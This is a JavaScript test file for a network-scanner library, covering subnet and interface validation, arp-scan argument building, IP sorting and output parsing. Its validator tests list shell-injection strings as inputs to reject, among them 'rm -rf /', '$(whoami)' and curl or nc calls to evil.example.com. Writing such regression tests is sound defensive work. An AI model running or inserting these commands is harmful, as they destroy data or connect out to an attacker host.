// ============================================================
//  lib/net.js — subnet validation, sorting, status vocabulary
// ============================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert');

const {
  normaliseSubnetToCidr, isValidInterface, buildArpScanArgs, buildDiscoveryScanArgs,
  ipSortKey, sortEntriesByIp, findEntryIndex, haPingStatus, decorateEntry,
  describeScanFailure, parseArpScanOutput,
} = require('../lib/net');

test('normaliseSubnetToCidr expands shorthand networks', () => {
  assert.equal(normaliseSubnetToCidr('192.168'),       '192.168.0.0/16');
  assert.equal(normaliseSubnetToCidr('192.168.1'),     '192.168.1.0/24');
  assert.equal(normaliseSubnetToCidr('10.0.0.0/8'),    '10.0.0.0/8');
  assert.equal(normaliseSubnetToCidr('172.16.5.0/24'), '172.16.5.0/24');
  assert.equal(normaliseSubnetToCidr('192.168.0.5'),   '192.168.0.5/24');
});

test('normaliseSubnetToCidr trims surrounding whitespace', () => {
  assert.equal(normaliseSubnetToCidr('  192.168.1  '), '192.168.1.0/24');
});

// This is the guard that stopped a shell-injection path in v2.4.0. If it ever
// regresses, a crafted subnet reaches arp-scan.
test('normaliseSubnetToCidr rejects anything that is not a plain network', () => {
  const attempts = [
    '192.168.1; rm -rf /',
    '$(whoami)',
    '`id`',
    '192.168.1.0/24 && curl evil.example.com',
    '192.168.1|nc evil.example.com 1234',
    '192.168.1\n192.168.2',
    '999.1.1.1',            // octet out of range
    '192.168.1.0/99',       // prefix out of range
    '192.168.1.0/7',        // prefix below the allowed minimum
    '../../etc/passwd',
    '192.168.1.0/',
    'localhost',
    '',
    null,
    undefined,
  ];
  for (const value of attempts) {
    assert.equal(normaliseSubnetToCidr(value), null, `should reject ${JSON.stringify(value)}`);
  }
});

test('isValidInterface accepts real device names and rejects the rest', () => {
  for (const good of ['eth0', 'ens18', 'br-lan', 'vmbr0', 'wlp2s0', 'eth0.100', 'eth0:1']) {
    assert.ok(isValidInterface(good), `should accept ${good}`);
  }
  for (const bad of ['eth0; rm -rf /', 'eth0 && id', '', 'a'.repeat(33), 'eth0|nc', '$(id)']) {
    assert.ok(!isValidInterface(bad), `should reject ${JSON.stringify(bad)}`);
  }
});

test('buildArpScanArgs produces an argument array, never a shell string', () => {
  assert.deepEqual(buildArpScanArgs('192.168.1'), ['192.168.1.0/24']);
  assert.deepEqual(buildArpScanArgs('192.168.1', 'eth0'), ['-I', 'eth0', '192.168.1.0/24']);
  // Invalid input must produce null so the caller can return 400 rather than scan.
  assert.equal(buildArpScanArgs('192.168.1; id'), null);
  assert.equal(buildArpScanArgs('192.168.1', 'eth0; id'), null);
});

// This test previously asserted that --quiet was passed, which is how the
// broken behaviour survived: the test agreed with the code and both were wrong.
// A test that pins down an argument without knowing what the argument does is
// worse than no test, because it makes the bug look deliberate.
test('buildDiscoveryScanArgs includes bandwidth only when it is a positive integer', () => {
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 1000),
    ['--bandwidth=1000K', '192.168.1.0/24']);
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 0),
    ['192.168.1.0/24']);
  assert.deepEqual(buildDiscoveryScanArgs('192.168.1', '', 'abc'),
    ['192.168.1.0/24']);
  assert.equal(buildDiscoveryScanArgs('bad subnet', '', 100), null);
});

test('ipSortKey orders across all four octets, not just the last', () => {
  const ips = ['192.168.0.10', '192.168.0.2', '10.0.0.1', '192.168.1.1', '172.16.5.99'];
  const sorted = [...ips].sort((a, b) => ipSortKey(a) - ipSortKey(b));
  assert.deepEqual(sorted, ['10.0.0.1', '172.16.5.99', '192.168.0.2', '192.168.0.10', '192.168.1.1']);
});

test('sortEntriesByIp sorts entry objects and 192.168.0.9 precedes 192.168.0.10', () => {
  const entries = [{ ip: '192.168.0.10' }, { ip: '192.168.0.9' }, { ip: '192.168.0.100' }];
  assert.deepEqual(sortEntriesByIp(entries).map(e => e.ip),
    ['192.168.0.9', '192.168.0.10', '192.168.0.100']);
});

test('findEntryIndex locates by exact IP and returns -1 when absent', () => {
  const data = [{ ip: '10.0.0.1' }, { ip: '10.0.0.2' }];
  assert.equal(findEntryIndex(data, '10.0.0.2'), 1);
  assert.equal(findEntryIndex(data, '10.0.0.3'), -1);
});

// The v2.0.2 bug: the ping cache stores up/down, the HA endpoints compared
// against alive/unreachable, so every device reported "unknown" for months.
test('haPingStatus accepts both vocabularies', () => {
  assert.equal(haPingStatus('up'), 'online');
  assert.equal(haPingStatus('alive'), 'online');
  assert.equal(haPingStatus('down'), 'offline');
  assert.equal(haPingStatus('unreachable'), 'offline');
  for (const unknown of [undefined, null, '', 'pending', 0]) {
    assert.equal(haPingStatus(unknown), 'unknown');
  }
});

test('decorateEntry derives label with the documented fallback chain', () => {
  assert.equal(decorateEntry({ ip: '10.0.0.1', assetName: 'NAS', hostname: 'nas.lan' }).label, 'NAS');
  assert.equal(decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan' }).label, 'nas.lan');
  assert.equal(decorateEntry({ ip: '10.0.0.1' }).label, '10.0.0.1');
});

test('decorateEntry composes serviceUrl and omits default ports', () => {
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan', healthScheme: 'https', healthPort: '443', healthPath: '/health' }).serviceUrl,
    'https://nas.lan/health');
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', hostname: 'nas.lan', healthScheme: 'http', healthPort: '80' }).serviceUrl,
    'http://nas.lan');
  assert.equal(
    decorateEntry({ ip: '10.0.0.1', healthScheme: 'https', healthPort: '8006' }).serviceUrl,
    'https://10.0.0.1:8006');
  // No health port means there is no service URL to compose.
  assert.equal(decorateEntry({ ip: '10.0.0.1' }).serviceUrl, null);
});

test('decorateEntry never mutates the entry it is given', () => {
  const original = { ip: '10.0.0.1', assetName: 'NAS' };
  const copy = { ...original };
  decorateEntry(original);
  assert.deepEqual(original, copy, 'stored data must not gain derived fields');
});

// ── Scan failure diagnostics ────────────────────────────────────────────────
// Discovery used to swallow arp-scan failures and report a successful scan that
// found nothing, which is indistinguishable from a quiet network. Each message
// below has to name the actual remedy.

test('a permission failure names the setcap command', () => {
  const advice = describeScanFailure(new Error('spawn arp-scan Operation not permitted'));
  assert.match(advice, /setcap cap_net_raw\+ep/);
});

test('a missing binary says to install it', () => {
  const advice = describeScanFailure(new Error('spawn arp-scan ENOENT'));
  assert.match(advice, /not installed/);
  assert.match(advice, /apt-get install arp-scan/);
});

test('a timeout points at the subnet size rather than a missing package', () => {
  const advice = describeScanFailure(new Error('ETIMEDOUT'));
  assert.match(advice, /timed out/);
  assert.doesNotMatch(advice, /not installed/, 'a timeout is not a missing binary');
});

test('an unrecognised failure still carries the original message', () => {
  const advice = describeScanFailure(new Error('something else entirely'));
  assert.match(advice, /something else entirely/);
});

test('a non-Error value does not crash the diagnostic', () => {
  assert.equal(typeof describeScanFailure('plain string'), 'string');
  assert.equal(typeof describeScanFailure(null), 'string');
  assert.equal(typeof describeScanFailure(undefined), 'string');
});

// ── arp-scan output parsing ─────────────────────────────────────────────────
// The bug this guards: arp-scan omits the OUI vendor column under --quiet, and
// the background discovery sweep passes --quiet. A parser that required three
// columns discarded every line and reported zero devices — on a server where
// arp-scan was installed, permitted and working. The manual scan, which does
// not pass --quiet, kept working, which made it look like a Network Watch bug.

const NORMAL_OUTPUT = [
  'Interface: eth0, type: EN10MB, MAC: bc:24:11:aa:bb:cc, IPv4: 192.168.0.5',
  'Starting arp-scan 1.9.7 with 256 hosts',
  '192.168.0.1\t3c:22:fb:11:22:01\tApple, Inc.',
  '192.168.0.50\t00:11:32:aa:bb:cc\tSynology Incorporated',
  '192.168.0.120\tb8:27:eb:00:11:22\tRaspberry Pi Foundation',
  '',
  '3 packets received by filter, 0 packets dropped by kernel',
  'Ending arp-scan 1.9.7: 256 hosts scanned in 2.5 seconds',
].join('\n');

// Exactly the same sweep with --quiet: no vendor column at all.
const QUIET_OUTPUT = [
  'Interface: eth0, type: EN10MB, MAC: bc:24:11:aa:bb:cc, IPv4: 192.168.0.5',
  '192.168.0.1\t3c:22:fb:11:22:01',
  '192.168.0.50\t00:11:32:aa:bb:cc',
  '192.168.0.120\tb8:27:eb:00:11:22',
].join('\n');

test('normal arp-scan output parses with vendors', () => {
  const rows = parseArpScanOutput(NORMAL_OUTPUT);
  assert.equal(rows.length, 3);
  assert.deepEqual(rows[0], { ip: '192.168.0.1', mac: '3c:22:fb:11:22:01', vendor: 'Apple, Inc.' });
  assert.equal(rows[1].vendor, 'Synology Incorporated');
});

test('--quiet output parses too, with a null vendor', () => {
  // This is the regression. Requiring the vendor column dropped all three rows
  // and the sweep reported an empty network.
  const rows = parseArpScanOutput(QUIET_OUTPUT);
  assert.equal(rows.length, 3, 'every device must be found without a vendor column');
  assert.equal(rows[0].ip, '192.168.0.1');
  assert.equal(rows[0].mac, '3c:22:fb:11:22:01');
  assert.equal(rows[0].vendor, null);
});

test('both output forms find the same devices', () => {
  const withVendor = parseArpScanOutput(NORMAL_OUTPUT).map((r) => `${r.ip} ${r.mac}`);
  const without = parseArpScanOutput(QUIET_OUTPUT).map((r) => `${r.ip} ${r.mac}`);
  assert.deepEqual(without, withVendor, 'the --quiet flag must not change which devices are seen');
});

test('headers, footers and blank lines are ignored', () => {
  const rows = parseArpScanOutput(NORMAL_OUTPUT);
  assert.ok(!rows.some((r) => r.ip === '192.168.0.5'), 'the interface header is not a device');
});

test('a trailing-whitespace vendor column is treated as absent', () => {
  const rows = parseArpScanOutput('192.168.0.1\t3c:22:fb:11:22:01   ');
  assert.equal(rows.length, 1);
  assert.equal(rows[0].vendor, null);
});

test('empty and non-string input yields no rows', () => {
  assert.deepEqual(parseArpScanOutput(''), []);
  assert.deepEqual(parseArpScanOutput(null), []);
  assert.deepEqual(parseArpScanOutput(undefined), []);
});

test('the discovery sweep no longer suppresses the vendor decode', () => {
  const args = buildDiscoveryScanArgs('192.168.0.0/24', '', 1000);
  assert.ok(!args.includes('--quiet'), '--quiet costs the vendor column for no benefit');
  assert.ok(args.includes('192.168.0.0/24'));
});
